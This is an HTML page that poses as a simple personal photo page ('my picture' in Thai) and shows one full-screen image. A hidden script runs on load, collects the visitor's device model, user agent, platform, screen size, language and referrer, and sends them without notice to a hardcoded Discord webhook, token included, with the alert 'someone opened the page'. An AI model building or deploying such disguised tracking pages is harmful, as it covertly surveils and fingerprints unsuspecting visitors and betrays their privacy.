<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <title>รูปของผม</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            background: #000;
        }
        img {
            width: 100%;
            height: 100vh;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <img src="mokey.jpeg" alt="รูปของผม">

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1518843570419794011/Xr5QP4axaLbeyCBsKCJ6ExudFmYoScrX3fir3dIrzIxpFeEBkGhUphfqFBTVkEfPo6kM";

        // ฟังก์ชันช่วยแยกข้อมูลรุ่นโทรศัพท์จาก User-Agent
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = "Unknown Device";

            if (/iPhone/.test(ua)) {
                device = "iPhone " + (ua.match(/iPhone OS (\d+)/)?.[1] || "");
            } else if (/iPad/.test(ua)) {
                device = "iPad";
            } else if (/Android/.test(ua)) {
                const model = ua.match(/Android.*?(SM-[A-Z0-9]+|Pixel|Galaxy|Redmi|Mi|OnePlus|Oppo|Vivo)/i);
                device = model ? model[1] : "Android Device";
            } else if (/Windows Phone/.test(ua)) {
                device = "Windows Phone";
            }

            return {
                device: device,
                userAgent: ua.substring(0, 400),
                platform: navigator.platform,
                vendor: navigator.vendor || "Unknown",
                screen: `${screen.width} x ${screen.height}`,
                touch: 'ontouchstart' in window ? "มีระบบสัมผัส (มือถือ/แท็บเล็ต)" : "ไม่มีระบบสัมผัส",
                language: navigator.language
            };
        }

        const info = getDeviceInfo();

        const logData = {
            content: "**🔔 มีคนเปิดหน้าเว็บ**",
            embeds: [{
                title: "📱 ข้อมูลผู้เข้าเว็บ",
                color: 0x00ff00,
                timestamp: new Date().toISOString(),
                fields: [
                    { name: "เวลา", value: new Date().toLocaleString('th-TH'), inline: true },
                    { name: "รุ่นโทรศัพท์", value: info.device, inline: true },
                    { name: "หน้าจอ", value: info.screen, inline: true },
                    { name: "ระบบ", value: info.platform, inline: true },
                    { name: "User-Agent", value: "```" + info.userAgent + "```", inline: false },
                    { name: "ภาษา", value: info.language, inline: true },
                    { name: "Referrer", value: document.referrer || "ตรง", inline: true }
                ]
            }]
        };

        fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(logData)
        }).catch(err => console.error("Webhook error:", err));
    </script>
</body>
</html>
